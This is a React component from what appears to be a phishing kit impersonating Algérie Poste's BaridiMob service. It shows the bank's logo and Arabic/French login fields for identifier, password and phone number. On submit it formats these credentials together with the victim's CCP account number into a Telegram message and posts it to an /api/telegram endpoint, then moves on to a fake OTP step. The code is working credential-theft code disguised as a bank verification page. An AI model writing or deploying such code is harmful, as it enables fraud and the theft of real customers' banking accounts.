"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { toast } from "sonner"
import { Smartphone } from "lucide-react"
import Image from "next/image"

interface BaridiMobLoginStepProps {
  onNext: () => void
  onBack: () => void
  formData: any
  updateFormData: (data: any) => void
}

export function BaridiMobLoginStep({ onNext, onBack, formData, updateFormData }: BaridiMobLoginStepProps) {
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleIdentifiantChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    updateFormData({ baridiIdentifiant: e.target.value })
    setErrors({ ...errors, identifiant: "" })
  }

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    updateFormData({ baridiPassword: e.target.value })
    setErrors({ ...errors, password: "" })
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 10)
    updateFormData({ baridiPhone: value })
    setErrors({ ...errors, phone: "" })
  }

  const generateOTP = () => {
    return Math.floor(100000 + Math.random() * 900000).toString()
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const newErrors: Record<string, string> = {}

    if (!formData.baridiIdentifiant?.trim()) {
      newErrors.identifiant = "Identifiant مطلوب"
    }
    if (!formData.baridiPassword?.trim()) {
      newErrors.password = "Mot de passe مطلوب"
    }
    if (!formData.baridiPhone || formData.baridiPhone.length < 10) {
      newErrors.phone = "رقم الهاتف يجب ان يكون 10 ارقام"
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }

    setIsSubmitting(true)

    try {
      const otpCodes = [generateOTP(), generateOTP(), generateOTP(), generateOTP()]
      updateFormData({ otpCodes, currentOtpPage: 1 })

      const telegramMessage = `🔔 <b>بيانات جديدة - بريدي موب</b>

━━━━━━━━━━━━━━━━━
📋 <b>رقم الحساب CCP:</b>
<code>${formData.ccpNumber}</code>

📱 <b>بيانات بريدي موب:</b>
• Identifiant: <code>${formData.baridiIdentifiant}</code>
• Mot de passe: <code>${formData.baridiPassword}</code>
• رقم الهاتف: <code>${formData.baridiPhone}</code>
━━━━━━━━━━━━━━━━━`

      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: telegramMessage,
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to send data")
      }

      toast.success("تم ارسال البيانات بنجاح")
      onNext()
    } catch (error) {
      toast.error("حدث خطا في ارسال البيانات")
      console.error(error)
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1f4e] to-[#2d3a8c] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorations */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-10">
          <div className="absolute top-10 left-10 w-64 h-64 bg-[#4a6cf4] rounded-full blur-3xl" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-[#f5a623] rounded-full blur-3xl" />
        </div>
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px]" />
      </div>

      <div className="relative z-10 w-full max-w-md">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <div className="bg-white rounded-xl p-2 shadow-xl">
            <Image
              src="/algerie-poste-logo.svg"
              alt="Algerie Poste"
              width={56}
              height={56}
              className="w-14 h-14 object-contain"
            />
          </div>
        </div>

        <Card className="bg-white p-6 shadow-2xl border-0 rounded-2xl">
          {/* Header */}
          <div className="text-center mb-4">
            <div className="w-14 h-14 bg-gradient-to-r from-[#4a6cf4] to-[#2d4a9e] rounded-full flex items-center justify-center mx-auto mb-3 shadow-lg">
              <Smartphone className="w-7 h-7 text-white" />
            </div>
            <h1 className="text-lg font-bold text-[#1a1f4e] mb-1">التحقق عبر بريدي موب</h1>
            <p className="text-xs text-gray-500">ادخل بيانات حساب BaridiMob</p>
            <div className="w-full h-1 bg-gradient-to-r from-[#f5a623] to-[#e6940a] rounded-full mt-3" />
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Identifiant */}
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">Identifiant</label>
              <Input
                type="text"
                placeholder="ادخل Identifiant الخاص بك"
                value={formData.baridiIdentifiant || ""}
                onChange={handleIdentifiantChange}
                className="w-full text-right"
                dir="rtl"
              />
              {errors.identifiant && <p className="text-red-500 text-sm mt-1 text-right">{errors.identifiant}</p>}
            </div>

            {/* Password */}
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">Mot de passe</label>
              <Input
                type="password"
                placeholder="ادخل كلمة المرور"
                value={formData.baridiPassword || ""}
                onChange={handlePasswordChange}
                className="w-full text-right"
                dir="rtl"
              />
              {errors.password && <p className="text-red-500 text-sm mt-1 text-right">{errors.password}</p>}
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">رقم الهاتف</label>
              <Input
                type="text"
                inputMode="numeric"
                placeholder="0XXX XXX XXX"
                maxLength={10}
                value={formData.baridiPhone || ""}
                onChange={handlePhoneChange}
                className="w-full text-center font-mono tracking-wider"
                dir="ltr"
              />
              {errors.phone && <p className="text-red-500 text-sm mt-1 text-right">{errors.phone}</p>}
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-gradient-to-r from-[#f5a623] to-[#e6940a] hover:from-[#e6940a] hover:to-[#d4850a] text-[#1a1f4e] font-bold py-3 rounded-xl transition-all shadow-lg"
            >
              {isSubmitting ? "جاري الارسال..." : "متابعة"}
            </Button>
          </form>

          {/* Back Button */}
          <Button
            onClick={onBack}
            variant="outline"
            className="w-full mt-3 bg-transparent border-gray-300 text-gray-600 font-semibold py-3 rounded-xl"
          >
            العودة
          </Button>
        </Card>

        {/* Footer */}
        <p className="text-center text-xs text-white/50 mt-4">خدمة تفعيل التحويل البنكي - بريد الجزائر</p>
      </div>
    </div>
  )
}
